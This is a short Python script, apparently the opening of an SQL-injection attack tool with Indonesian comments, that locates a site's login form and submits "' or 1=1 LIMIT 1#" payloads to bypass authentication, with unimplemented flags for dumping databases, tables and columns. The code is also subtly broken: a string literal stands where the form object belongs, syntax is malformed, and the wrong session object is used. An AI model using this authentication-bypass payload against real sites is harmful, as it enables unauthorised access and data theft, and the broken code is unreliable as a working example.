from os import name
import requests
from getopt import getopt
import sys
from bs4 import BeautifulSoup
from requests.sessions import session

s = requests.session()

TARGET = ""
URI = ""
DATABASE = False
TABLE = False
COLUMN = False
DATA = False
DUMP = False

opts, _ = getopt(sys.argv[1:], "t:u", ["target", "uri",
                                       "database", "table", "column", "data", "dump"])
# python attack.py -t http://localhost:8000 -u /login.php


for key, value in opts:
    if key in ["-t", "--target"]:
        TARGET = value
    if key in ["-u", "--uri"]:
        URI = value
    if key == "--database":
        DATABASE = True
    if key == "--table":
        TABLE = True
    if key == "--column":
        COLUMN = True
    if key == "--data":
        DATA = True
    if key == "--dump":
        DUMP = True

# cek kita sudah login atau belum atau ada redirection dari website
resp = session.get(TARGET + URI)
# print(resp.status_code)
# print(resp.url)

if resp.url != (TARGET + URI):
    # belum login
    soup = BeautifulSoup(resp.text, "html.parser")
    login_form = soup.find("form")
    # print(login_form["action"], login_form["method"])
    session.request(login_form["method"], TARGET + "/" + login_form["action"], data={
        "csrf_token : login_from".find(
            "input", attrs={name: "csrf_token"})["value"],
        "action": login_form.find("input", attrs={"name": "action"})["value"]
        "username": "' or 1=1 LIMIT 1#",
        "password": "' or 1=1 LIMIT 1"
    })
    print(resp.url)
    resp = session.get(TARGET + URI)
    if (TARGET + URI) == resp.url:
        print("login successful")
        # mulai proses attack
    else:
        print("failed to bypass login")
